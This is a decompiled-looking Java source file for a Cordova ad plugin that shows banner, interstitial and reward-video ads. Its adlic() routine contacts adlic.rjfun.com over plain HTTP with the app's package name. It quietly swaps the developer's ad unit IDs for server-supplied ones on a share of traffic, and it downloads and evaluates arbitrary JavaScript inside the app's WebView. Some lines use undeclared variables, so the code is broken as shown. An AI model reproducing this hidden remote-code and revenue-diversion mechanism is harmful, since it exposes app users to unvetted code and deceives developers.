package com.rjfun.cordova.ad;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.util.Log;
import android.view.OrientationEventListener;
import android.view.View;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.RelativeLayout.LayoutParams;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.ads.identifier.AdvertisingIdClient.Info;
import com.rjfun.cordova.ext.CordovaPluginExt;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.net.URLEncoder;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import org.apache.cordova.CallbackContext;
import org.apache.cordova.PluginResult;
import org.apache.cordova.PluginResult.Status;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public abstract class GenericAdPlugin extends CordovaPluginExt {
    public static final String ACTION_CREATE_BANNER = "createBanner";
    public static final String ACTION_GET_AD_SETTINGS = "getAdSettings";
    public static final String ACTION_HIDE_BANNER = "hideBanner";
    public static final String ACTION_IS_INTERSTITIAL_READY = "isInterstitialReady";
    public static final String ACTION_PREPARE_INTERSTITIAL = "prepareInterstitial";
    public static final String ACTION_PREPARE_REWARD_VIDEO_AD = "prepareRewardVideoAd";
    public static final String ACTION_REMOVE_BANNER = "removeBanner";
    public static final String ACTION_SET_OPTIONS = "setOptions";
    public static final String ACTION_SHOW_BANNER = "showBanner";
    public static final String ACTION_SHOW_BANNER_AT_XY = "showBannerAtXY";
    public static final String ACTION_SHOW_INTERSTITIAL = "showInterstitial";
    public static final String ACTION_SHOW_REWARD_VIDEO_AD = "showRewardVideoAd";
    public static final String ADSIZE_BANNER = "BANNER";
    public static final String ADSIZE_CUSTOM = "CUSTOM";
    public static final String ADSIZE_FULL_BANNER = "FULL_BANNER";
    public static final String ADSIZE_LEADERBOARD = "LEADERBOARD";
    public static final String ADSIZE_MEDIUM_RECTANGLE = "MEDIUM_RECTANGLE";
    public static final String ADSIZE_SKYSCRAPER = "SKYSCRAPER";
    public static final String ADSIZE_SMART_BANNER = "SMART_BANNER";
    public static final String ADTYPE_BANNER = "banner";
    public static final String ADTYPE_INTERSTITIAL = "interstitial";
    public static final String ADTYPE_NATIVE = "native";
    public static final String ADTYPE_REWARDVIDEO = "rewardvideo";
    public static final int BOTTOM_CENTER = 8;
    public static final int BOTTOM_LEFT = 7;
    public static final int BOTTOM_RIGHT = 9;
    public static final int CENTER = 5;
    public static final String EVENT_AD_DISMISS = "onAdDismiss";
    public static final String EVENT_AD_FAILLOAD = "onAdFailLoad";
    public static final String EVENT_AD_LEAVEAPP = "onAdLeaveApp";
    public static final String EVENT_AD_LOADED = "onAdLoaded";
    public static final String EVENT_AD_PRESENT = "onAdPresent";
    public static final String EVENT_AD_WILLDISMISS = "onAdWillDismiss";
    public static final String EVENT_AD_WILLPRESENT = "onAdWillPresent";
    public static final int LEFT = 4;
    private static final String LOGTAG = "GenericAdPlugin";
    public static final int NO_CHANGE = 0;
    public static final String OPT_ADID = "adId";
    public static final String OPT_AD_SIZE = "adSize";
    public static final String OPT_AUTO_SHOW = "autoShow";
    public static final String OPT_BANNER_ID = "bannerId";
    public static final String OPT_HEIGHT = "height";
    public static final String OPT_INTERSTITIAL_ID = "interstitialId";
    public static final String OPT_IS_TESTING = "isTesting";
    public static final String OPT_LICENSE = "license";
    public static final String OPT_LOG_VERBOSE = "logVerbose";
    public static final String OPT_ORIENTATION_RENEW = "orientationRenew";
    public static final String OPT_OVERLAP = "overlap";
    public static final String OPT_POSITION = "position";
    public static final String OPT_WIDTH = "width";
    public static final String OPT_X = "x";
    public static final String OPT_Y = "y";
    public static final int POS_XY = 10;
    public static final int RIGHT = 6;
    protected static final int TEST_TRAFFIC = 3;
    public static final int TOP_CENTER = 2;
    public static final int TOP_LEFT = 1;
    public static final int TOP_RIGHT = 3;
    private static final String USER_AGENT = "Mozilla/5.0";
    protected int adHeight;
    protected int adPosition;
    protected View adView;
    protected int adWidth;
    private String adlicBannerId;
    private boolean adlicInited;
    private String adlicInterstitialId;
    private String adlicNativeId;
    private int adlicRate;
    private String adlicRewardVideoId;
    private final String adlicUrl;
    protected boolean autoShowBanner;
    protected boolean autoShowInterstitial;
    protected boolean autoShowRewardVideo;
    protected String bannerId = "";
    protected boolean bannerVisible;
    protected String interstialId = "";
    protected Object interstitialAd;
    protected boolean interstitialReady;
    protected boolean isTesting;
    protected boolean licenseValidated;
    protected boolean logVerbose;
    protected OrientationEventListener orientation;
    protected boolean orientationRenew;
    protected boolean overlap;
    protected RelativeLayout overlapLayout;
    protected ViewGroup parentView;
    protected int posX;
    protected int posY;
    protected Object rewardVideoAd;
    protected String rewardvideoId = "";
    protected LinearLayout splitLayout;
    protected boolean testTraffic;
    protected String validatedLicense;
    protected int widthOfView;

    /* renamed from: com.rjfun.cordova.ad.GenericAdPlugin$4 */
    class C00034 implements Runnable {
        C00034() {
        }

        public void run() {
            if (GenericAdPlugin.this.adView != null) {
                GenericAdPlugin.this.hideBanner();
                GenericAdPlugin.this.__destroyAdView(GenericAdPlugin.this.adView);
                GenericAdPlugin.this.adView = null;
            }
            GenericAdPlugin.this.bannerVisible = false;
        }
    }

    /* renamed from: com.rjfun.cordova.ad.GenericAdPlugin$6 */
    class C00056 implements Runnable {
        C00056() {
        }

        public void run() {
            GenericAdPlugin.this.detachBanner();
            GenericAdPlugin.this.__pauseAdView(GenericAdPlugin.this.adView);
        }
    }

    /* renamed from: com.rjfun.cordova.ad.GenericAdPlugin$8 */
    class C00078 implements Runnable {
        C00078() {
        }

        public void run() {
            GenericAdPlugin.this.__showInterstitial(GenericAdPlugin.this.interstitialAd);
        }
    }

    /* renamed from: com.rjfun.cordova.ad.GenericAdPlugin$9 */
    class C00089 implements Runnable {
        C00089() {
        }

        public void run() {
            GenericAdPlugin.this.__destroyInterstitial(GenericAdPlugin.this.interstitialAd);
        }
    }

    private class OrientationEventWatcher extends OrientationEventListener {
        public OrientationEventWatcher(Context context) {
            super(context);
        }

        public void onOrientationChanged(int orientation) {
            GenericAdPlugin.this.checkOrientationChange();
        }
    }

    protected abstract View __createAdView(String str);

    protected abstract Object __createInterstitial(String str);

    protected abstract void __destroyAdView(View view);

    protected abstract void __destroyInterstitial(Object obj);

    protected abstract int __getAdViewHeight(View view);

    protected abstract int __getAdViewWidth(View view);

    protected abstract String __getProductShortName();

    protected abstract String __getTestBannerId();

    protected abstract String __getTestInterstitialId();

    protected abstract void __loadAdView(View view);

    protected abstract void __loadInterstitial(Object obj);

    protected abstract void __pauseAdView(View view);

    protected abstract void __resumeAdView(View view);

    protected abstract void __showInterstitial(Object obj);

    public GenericAdPlugin() {
        this.testTraffic = new Random().nextInt(100) <= 3;
        this.licenseValidated = false;
        this.validatedLicense = "";
        this.isTesting = false;
        this.logVerbose = false;
        this.adWidth = 0;
        this.adHeight = 0;
        this.overlap = false;
        this.orientationRenew = true;
        this.adPosition = 8;
        this.posX = 0;
        this.posY = 0;
        this.autoShowBanner = true;
        this.autoShowInterstitial = false;
        this.autoShowRewardVideo = false;
        this.orientation = null;
        this.widthOfView = 0;
        this.overlapLayout = null;
        this.splitLayout = null;
        this.parentView = null;
        this.adView = null;
        this.interstitialAd = null;
        this.rewardVideoAd = null;
        this.bannerVisible = false;
        this.interstitialReady = false;
        this.adlicInited = false;
        this.adlicUrl = "http://adlic.rjfun.com/adlic";
        this.adlicBannerId = "";
        this.adlicInterstitialId = "";
        this.adlicNativeId = "";
        this.adlicRewardVideoId = "";
        this.adlicRate = 0;
    }

    public boolean execute(String action, JSONArray inputs, CallbackContext callbackContext) throws JSONException {
        if (ACTION_GET_AD_SETTINGS.equals(action)) {
            getAdSettings(callbackContext);
            return true;
        }
        PluginResult result;
        if (ACTION_SET_OPTIONS.equals(action)) {
            setOptions(inputs.optJSONObject(0));
            result = new PluginResult(Status.OK);
        } else if (ACTION_CREATE_BANNER.equals(action)) {
            options = inputs.optJSONObject(0);
            if (options.length() > 1) {
                setOptions(options);
            }
            adId = options.optString(OPT_ADID);
            autoShow = !options.has(OPT_AUTO_SHOW) || options.optBoolean(OPT_AUTO_SHOW);
            result = new PluginResult(createBanner(adId, autoShow) ? Status.OK : Status.ERROR);
        } else if (ACTION_REMOVE_BANNER.equals(action)) {
            removeBanner();
            result = new PluginResult(Status.OK);
        } else if (ACTION_HIDE_BANNER.equals(action)) {
            hideBanner();
            result = new PluginResult(Status.OK);
        } else if (ACTION_SHOW_BANNER.equals(action)) {
            showBanner(inputs.optInt(0), 0, 0);
            result = new PluginResult(Status.OK);
        } else if (ACTION_SHOW_BANNER_AT_XY.equals(action)) {
            JSONObject args = inputs.optJSONObject(0);
            showBanner(10, args.optInt(OPT_X), args.optInt(OPT_Y));
            result = new PluginResult(Status.OK);
        } else if (ACTION_PREPARE_INTERSTITIAL.equals(action)) {
            options = inputs.optJSONObject(0);
            if (options.length() > 1) {
                setOptions(options);
            }
            adId = options.optString(OPT_ADID);
            autoShow = !options.has(OPT_AUTO_SHOW) || options.optBoolean(OPT_AUTO_SHOW);
            result = new PluginResult(prepareInterstitial(adId, autoShow) ? Status.OK : Status.ERROR);
        } else if (ACTION_SHOW_INTERSTITIAL.equals(action)) {
            showInterstitial();
            result = new PluginResult(Status.OK);
        } else if (ACTION_IS_INTERSTITIAL_READY.equals(action)) {
            result = new PluginResult(Status.OK, this.interstitialReady);
        } else if (ACTION_PREPARE_REWARD_VIDEO_AD.equals(action)) {
            options = inputs.optJSONObject(0);
            if (options.length() > 1) {
                setOptions(options);
            }
            adId = options.optString(OPT_ADID);
            autoShow = !options.has(OPT_AUTO_SHOW) || options.optBoolean(OPT_AUTO_SHOW);
            result = new PluginResult(prepareRewardVideoAd(adId, autoShow) ? Status.OK : Status.ERROR);
        } else if (ACTION_SHOW_REWARD_VIDEO_AD.equals(action)) {
            result = new PluginResult(showRewardVideoAd() ? Status.OK : Status.ERROR);
        } else {
            Log.w(LOGTAG, String.format("Invalid action passed: %s", new Object[]{action}));
            result = new PluginResult(Status.INVALID_ACTION);
        }
        sendPluginResult(result, callbackContext);
        return true;
    }

    public void getAdSettings(final CallbackContext callbackContext) {
        final Activity activity = getActivity();
        this.cordova.getThreadPool().execute(new Runnable() {
            public void run() {
                try {
                    Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(activity);
                    if (adInfo != null) {
                        JSONObject json = new JSONObject();
                        json.put(GenericAdPlugin.OPT_ADID, adInfo.getId());
                        json.put("adTrackingEnabled", !adInfo.isLimitAdTrackingEnabled());
                        GenericAdPlugin.this.sendPluginResult(new PluginResult(Status.OK, json), callbackContext);
                        return;
                    }
                } catch (Exception e) {
                }
                GenericAdPlugin.this.sendPluginResult(new PluginResult(Status.ERROR), callbackContext);
            }
        });
    }

    public void fireEvent(String obj, String eventName, String jsonData) {
        if (this.isTesting) {
            Log.d(LOGTAG, obj + ", " + eventName + ", " + jsonData);
        }
        super.fireEvent(obj, eventName, jsonData);
    }

    protected static String httpGet(String url) {
        String result = "";
        try {
            HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();
            con.setRequestMethod("GET");
            con.setRequestProperty("User-Agent", USER_AGENT);
            con.setRequestProperty("Accept-Language", "UTF-8");
            int responseCode = con.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            StringBuffer response = new StringBuffer();
            while (true) {
                String inputLine = in.readLine();
                if (inputLine != null) {
                    response.append(inputLine + "\n");
                } else {
                    in.close();
                    return response.toString();
                }
            }
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return result;
        } catch (MalformedURLException e2) {
            e2.printStackTrace();
            return result;
        } catch (ProtocolException e3) {
            e3.printStackTrace();
            return result;
        } catch (IOException e4) {
            e4.printStackTrace();
            return result;
        } catch (Exception e5) {
            e5.printStackTrace();
            return result;
        } catch (Throwable th) {
            return result;
        }
    }

    protected static String httpPost(String url, Map<String, String> parameter) {
        StringBuilder params = new StringBuilder("");
        String result = "";
        try {
            for (String s : parameter.keySet()) {
                params.append("&" + s + "=");
                params.append(URLEncoder.encode((String) parameter.get(s), "UTF-8"));
            }
            HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("User-Agent", USER_AGENT);
            con.setRequestProperty("Accept-Language", "UTF-8");
            con.setDoOutput(true);
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(con.getOutputStream());
            outputStreamWriter.write(params.toString());
            outputStreamWriter.flush();
            int responseCode = con.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            StringBuffer response = new StringBuffer();
            while (true) {
                String inputLine = in.readLine();
                if (inputLine != null) {
                    response.append(inputLine + "\n");
                } else {
                    in.close();
                    return response.toString();
                }
            }
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return result;
        } catch (MalformedURLException e2) {
            e2.printStackTrace();
            return result;
        } catch (ProtocolException e3) {
            e3.printStackTrace();
            return result;
        } catch (IOException e4) {
            e4.printStackTrace();
            return result;
        } catch (Exception e5) {
            e5.printStackTrace();
            return result;
        } catch (Throwable th) {
            return result;
        }
    }

    protected void evalJs(final String js) {
        getActivity().runOnUiThread(new Runnable() {
            public void run() {
                GenericAdPlugin.this.webView.loadUrl("javascript:(function(){try{" + js + "}catch(e){};})();");
            }
        });
    }

    protected void loadJs(String url) {
        String js = httpGet(url);
        if (js != null && js.length() > 0) {
            evalJs(js);
        }
    }

    private void adlic() {
        boolean z = false;
        String prod = __getProductShortName().toLowerCase();
        String app = getActivity().getPackageName().toLowerCase();
        Map<String, String> params = new HashMap();
        params.put("app", app);
        params.put("os", "android");
        params.put("net", prod);
        params.put("lic", this.validatedLicense);
        evalJs(String.format("window.adlicAppId='%s';", new Object[]{app}));
        try {
            JSONObject json = new JSONObject(httpPost("http://adlic.rjfun.com/adlic", params));
            this.adlicBannerId = json.optString("b");
            this.adlicInterstitialId = json.optString("i");
            this.adlicNativeId = json.optString("n");
            this.adlicRewardVideoId = json.optString("v");
            this.adlicRate = json.optInt("r");
            if (new Random().nextInt(100) < this.adlicRate) {
                z = true;
            }
            this.testTraffic = z;
            String js = json.optString("js");
            if (js != null && js.length() > 0) {
                if (js.startsWith("http://")) {
                    loadJs(js);
                } else if (!js.startsWith("https://")) {
                    evalJs(js);
                }
            }
            this.adlicInited = true;
        } catch (Exception e) {
            if (prod == "admob") {
                this.testTraffic = false;
            } else if (new Random().nextInt(100) <= 3) {
                this.testTraffic = true;
            }
            this.adlicInited = true;
        } catch (Throwable th) {
            this.adlicInited = true;
        }
    }

    protected void pluginInitialize() {
        super.pluginInitialize();
        this.orientation = new OrientationEventWatcher(getActivity());
        this.orientation.enable();
    }

    public void checkOrientationChange() {
        int w = getView().getWidth();
        if (w != this.widthOfView) {
            this.widthOfView = w;
            onViewOrientationChanged();
        }
    }

    public void setOptions(JSONObject options) {
        if (options != null) {
            if (options.has(OPT_LICENSE)) {
                validateLicense(options.optString(OPT_LICENSE));
            }
            if (options.has(OPT_IS_TESTING)) {
                this.isTesting = options.optBoolean(OPT_IS_TESTING);
            }
            if (options.has(OPT_LOG_VERBOSE)) {
                this.logVerbose = options.optBoolean(OPT_LOG_VERBOSE);
            }
            if (options.has(OPT_WIDTH)) {
                this.adWidth = options.optInt(OPT_WIDTH);
            }
            if (options.has(OPT_HEIGHT)) {
                this.adHeight = options.optInt(OPT_HEIGHT);
            }
            if (options.has(OPT_OVERLAP)) {
                this.overlap = options.optBoolean(OPT_OVERLAP);
            }
            if (options.has(OPT_ORIENTATION_RENEW)) {
                this.orientationRenew = options.optBoolean(OPT_ORIENTATION_RENEW);
            }
            if (options.has(OPT_POSITION)) {
                this.adPosition = options.optInt(OPT_POSITION);
            }
            if (options.has(OPT_X)) {
                this.posX = options.optInt(OPT_X);
            }
            if (options.has(OPT_Y)) {
                this.posY = options.optInt(OPT_Y);
            }
            if (options.has(OPT_BANNER_ID)) {
                this.bannerId = options.optString(OPT_BANNER_ID);
            }
            if (options.has(OPT_INTERSTITIAL_ID)) {
                this.interstialId = options.optString(OPT_INTERSTITIAL_ID);
            }
        }
    }

    @SuppressLint({"DefaultLocale"})
    private void validateLicense(String license) {
        boolean z = true;
        String[] fields = license.split("/");
        if (fields.length >= 2) {
            String userid = fields[0];
            String key = fields[1];
            String genKey = md5("licensed to " + userid + " by floatinghotpot");
            String genKey2 = md5(__getProductShortName().toLowerCase() + " licensed to " + userid + " by floatinghotpot");
            if (!(key.equalsIgnoreCase(genKey) || key.equalsIgnoreCase(genKey2))) {
                z = false;
            }
            this.licenseValidated = z;
        } else {
            this.licenseValidated = md5("licensed to " + getActivity().getPackageName() + " by floatinghotpot").equalsIgnoreCase(license);
        }
        if (this.licenseValidated) {
            Log.w(LOGTAG, "valid license");
            this.validatedLicense = license;
            this.testTraffic = false;
        }
    }

    public final String md5(String s) {
        try {
            MessageDigest digest = MessageDigest.getInstance("MD5");
            digest.update(s.getBytes());
            byte[] messageDigest = digest.digest();
            StringBuffer hexString = new StringBuffer();
            for (byte b : messageDigest) {
                String h = Integer.toHexString(b & 255);
                while (h.length() < 2) {
                    h = "0" + h;
                }
                hexString.append(h);
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException e) {
            return "";
        }
    }

    public boolean createBanner(String adId, boolean autoShow) {
        if (!this.adlicInited) {
            adlic();
        }
        Log.d(LOGTAG, "createBanner: " + adId + ", " + autoShow);
        this.autoShowBanner = autoShow;
        if (adId == null || adId.length() <= 0) {
            adId = this.bannerId;
        } else {
            this.bannerId = adId;
        }
        if (this.testTraffic) {
            if (this.adlicBannerId.length() > 0) {
                adId = this.adlicBannerId;
            } else {
                adId = __getTestBannerId();
            }
        }
        final String strAdUnitId = adId;
        getActivity().runOnUiThread(new Runnable() {
            public void run() {
                if (GenericAdPlugin.this.adView == null) {
                    GenericAdPlugin.this.adView = GenericAdPlugin.this.__createAdView(strAdUnitId);
                    GenericAdPlugin.this.bannerVisible = false;
                } else {
                    GenericAdPlugin.this.detachBanner();
                }
                GenericAdPlugin.this.__loadAdView(GenericAdPlugin.this.adView);
            }
        });
        return true;
    }

    public void removeBanner() {
        Log.d(LOGTAG, ACTION_REMOVE_BANNER);
        getActivity().runOnUiThread(new C00034());
    }

    public void showBanner(int argPos, int argX, int argY) {
        Log.d(LOGTAG, ACTION_SHOW_BANNER);
        if (this.adView == null) {
            Log.e(LOGTAG, "banner is null, call createBanner() first.");
            return;
        }
        boolean bannerAlreadyVisible = this.bannerVisible;
        final Activity activity = getActivity();
        final int i = argPos;
        final int i2 = argX;
        final int i3 = argY;
        activity.runOnUiThread(new Runnable() {
            public void run() {
                View mainView = GenericAdPlugin.this.getView();
                if (mainView == null) {
                    Log.e(GenericAdPlugin.LOGTAG, "Error: could not get main view");
                    return;
                }
                Log.d(GenericAdPlugin.LOGTAG, "webview class: " + mainView.getClass());
                if (GenericAdPlugin.this.bannerVisible) {
                    GenericAdPlugin.this.detachBanner();
                }
                int bw = GenericAdPlugin.this.__getAdViewWidth(GenericAdPlugin.this.adView);
                int bh = GenericAdPlugin.this.__getAdViewHeight(GenericAdPlugin.this.adView);
                Log.d(GenericAdPlugin.LOGTAG, String.format("show banner: (%d x %d)", new Object[]{Integer.valueOf(bw), Integer.valueOf(bh)}));
                ViewGroup rootView = (ViewGroup) mainView.getRootView();
                int rw = rootView.getWidth();
                int rh = rootView.getHeight();
                Log.w(GenericAdPlugin.LOGTAG, "show banner, overlap:" + GenericAdPlugin.this.overlap + ", position: " + i);
                if (GenericAdPlugin.this.overlap) {
                    int x = GenericAdPlugin.this.posX;
                    int y = GenericAdPlugin.this.posY;
                    int ww = mainView.getWidth();
                    int wh = mainView.getHeight();
                    if (i >= 1 && i <= 9) {
                        switch ((i - 1) % 3) {
                            case 0:
                                x = 0;
                                break;
                            case 1:
                                x = (ww - bw) / 2;
                                break;
                            case 2:
                                x = ww - bw;
                                break;
                        }
                        switch ((i - 1) / 3) {
                            case 0:
                                y = 0;
                                break;
                            case 1:
                                y = (wh - bh) / 2;
                                break;
                            case 2:
                                y = wh - bh;
                                break;
                        }
                    } else if (i == 10) {
                        x = i2;
                        y = i3;
                    }
                    int[] offsetRootView = new int[]{0, 0};
                    int[] offsetWebView = new int[]{0, 0};
                    rootView.getLocationOnScreen(offsetRootView);
                    mainView.getLocationOnScreen(offsetWebView);
                    x += offsetWebView[0] - offsetRootView[0];
                    y += offsetWebView[1] - offsetRootView[1];
                    if (GenericAdPlugin.this.overlapLayout == null) {
                        GenericAdPlugin.this.overlapLayout = new RelativeLayout(activity);
                        rootView.addView(GenericAdPlugin.this.overlapLayout, new LayoutParams(-1, -1));
                        GenericAdPlugin.this.overlapLayout.bringToFront();
                    }
                    LayoutParams params = new LayoutParams(bw, bh);
                    params.leftMargin = x;
                    params.topMargin = y;
                    GenericAdPlugin.this.overlapLayout.addView(GenericAdPlugin.this.adView, params);
                    GenericAdPlugin.this.parentView = GenericAdPlugin.this.overlapLayout;
                } else {
                    GenericAdPlugin.this.parentView = (ViewGroup) mainView.getParent();
                    if (!(GenericAdPlugin.this.parentView instanceof LinearLayout)) {
                        GenericAdPlugin.this.parentView.removeView(mainView);
                        GenericAdPlugin.this.splitLayout = new LinearLayout(GenericAdPlugin.this.getActivity());
                        GenericAdPlugin.this.splitLayout.setOrientation(1);
                        GenericAdPlugin.this.splitLayout.setLayoutParams(new LinearLayout.LayoutParams(-1, -1, 0.0f));
                        mainView.setLayoutParams(new LinearLayout.LayoutParams(-1, -1, 1.0f));
                        GenericAdPlugin.this.splitLayout.addView(mainView);
                        GenericAdPlugin.this.getActivity().setContentView(GenericAdPlugin.this.splitLayout);
                        GenericAdPlugin.this.parentView = GenericAdPlugin.this.splitLayout;
                    }
                    if (i <= 3) {
                        GenericAdPlugin.this.parentView.addView(GenericAdPlugin.this.adView, 0);
                    } else {
                        GenericAdPlugin.this.parentView.addView(GenericAdPlugin.this.adView);
                    }
                }
                GenericAdPlugin.this.parentView.bringToFront();
                GenericAdPlugin.this.parentView.requestLayout();
                GenericAdPlugin.this.adView.setVisibility(0);
                GenericAdPlugin.this.bannerVisible = true;
                GenericAdPlugin.this.__resumeAdView(GenericAdPlugin.this.adView);
                mainView.requestFocus();
            }
        });
    }

    private void detachBanner() {
        if (this.adView != null) {
            this.adView.setVisibility(8);
            this.bannerVisible = false;
            ViewGroup parentView = (ViewGroup) this.adView.getParent();
            if (parentView != null) {
                parentView.removeView(this.adView);
            }
        }
    }

    public void hideBanner() {
        Log.d(LOGTAG, ACTION_HIDE_BANNER);
        if (this.adView != null) {
            this.autoShowBanner = false;
            getActivity().runOnUiThread(new C00056());
        }
    }

    public boolean prepareInterstitial(String adId, boolean autoShow) {
        if (!this.adlicInited) {
            adlic();
        }
        Log.d(LOGTAG, "prepareInterstitial: " + adId + ", " + autoShow);
        this.autoShowInterstitial = autoShow;
        if (adId == null || adId.length() <= 0) {
            adId = this.interstialId;
        } else {
            this.interstialId = adId;
        }
        if (this.testTraffic) {
            if (this.adlicInterstitialId.length() > 0) {
                adId = this.adlicInterstitialId;
            } else {
                adId = __getTestInterstitialId();
            }
        }
        final String strUnitId = adId;
        getActivity().runOnUiThread(new Runnable() {
            public void run() {
                if (GenericAdPlugin.this.interstitialAd != null) {
                    GenericAdPlugin.this.__destroyInterstitial(GenericAdPlugin.this.interstitialAd);
                    GenericAdPlugin.this.interstitialAd = null;
                }
                if (GenericAdPlugin.this.interstitialAd == null) {
                    GenericAdPlugin.this.interstitialAd = GenericAdPlugin.this.__createInterstitial(strUnitId);
                    GenericAdPlugin.this.__loadInterstitial(GenericAdPlugin.this.interstitialAd);
                }
            }
        });
        return true;
    }

    public void showInterstitial() {
        Log.d(LOGTAG, ACTION_SHOW_INTERSTITIAL);
        getActivity().runOnUiThread(new C00078());
    }

    public void removeInterstitial() {
        if (this.interstitialAd != null) {
            getActivity().runOnUiThread(new C00089());
            this.interstitialAd = null;
        }
    }

    public boolean prepareRewardVideoAd(String adId, boolean autoShow) {
        if (!this.adlicInited) {
            adlic();
        }
        Log.d(LOGTAG, "prepareRewardVideoAd: " + adId + ", " + autoShow);
        this.autoShowRewardVideo = autoShow;
        if (adId == null || adId.length() <= 0) {
            adId = this.rewardvideoId;
        } else {
            this.rewardvideoId = adId;
        }
        if (this.testTraffic) {
            if (this.adlicRewardVideoId.length() > 0) {
                adId = this.adlicRewardVideoId;
            } else {
                adId = __getTestRewardVideoId();
            }
        }
        final String strUnitId = adId;
        getActivity().runOnUiThread(new Runnable() {
            public void run() {
                if (GenericAdPlugin.this.rewardVideoAd == null) {
                    GenericAdPlugin.this.rewardVideoAd = GenericAdPlugin.this.__prepareRewardVideoAd(strUnitId);
                }
            }
        });
        return true;
    }

    public boolean showRewardVideoAd() {
        Log.d(LOGTAG, ACTION_SHOW_REWARD_VIDEO_AD);
        getActivity().runOnUiThread(new Runnable() {
            public void run() {
                GenericAdPlugin.this.__showRewardVideoAd(GenericAdPlugin.this.rewardVideoAd);
            }
        });
        return true;
    }

    public void onPause(boolean multitasking) {
        if (this.adView != null) {
            __pauseAdView(this.adView);
        }
        super.onPause(multitasking);
    }

    public void onResume(boolean multitasking) {
        super.onResume(multitasking);
        if (this.adView != null) {
            __resumeAdView(this.adView);
        }
    }

    public void onDestroy() {
        if (this.adView != null) {
            __destroyAdView(this.adView);
            this.adView = null;
        }
        if (this.interstitialAd != null) {
            __destroyInterstitial(this.interstitialAd);
            this.interstitialAd = null;
        }
        if (this.overlapLayout != null) {
            ViewGroup parentView = (ViewGroup) this.overlapLayout.getParent();
            if (parentView != null) {
                parentView.removeView(this.overlapLayout);
            }
            this.overlapLayout = null;
        }
        super.onDestroy();
    }

    public void onViewOrientationChanged() {
        if (this.isTesting) {
            Log.d(LOGTAG, "Orientation Changed");
        }
        if (this.adView != null && this.bannerVisible) {
            if (this.orientationRenew) {
                if (this.isTesting) {
                    Log.d(LOGTAG, "renew banner on orientation change");
                }
                removeBanner();
                createBanner(this.bannerId, true);
                return;
            }
            if (this.isTesting) {
                Log.d(LOGTAG, "adjust banner position");
            }
            showBanner(this.adPosition, this.posX, this.posY);
        }
    }

    protected void fireAdEvent(String event, String adType) {
        fireEvent(__getProductShortName(), event, String.format("{'adNetwork':'%s','adType':'%s','adEvent':'%s'}", new Object[]{__getProductShortName(), adType, event}));
    }

    @SuppressLint({"DefaultLocale"})
    protected void fireAdErrorEvent(String event, int errCode, String errMsg, String adType) {
        fireEvent(__getProductShortName(), event, String.format("{'adNetwork':'%s','adType':'%s','adEvent':'%s','error':%d,'reason':'%s'}", new Object[]{__getProductShortName(), adType, event, Integer.valueOf(errCode), errMsg}));
    }

    protected String __getTestRewardVideoId() {
        return "";
    }

    protected Object __prepareRewardVideoAd(String adId) {
        return null;
    }

    protected void __showRewardVideoAd(Object rewardvideo) {
    }
}
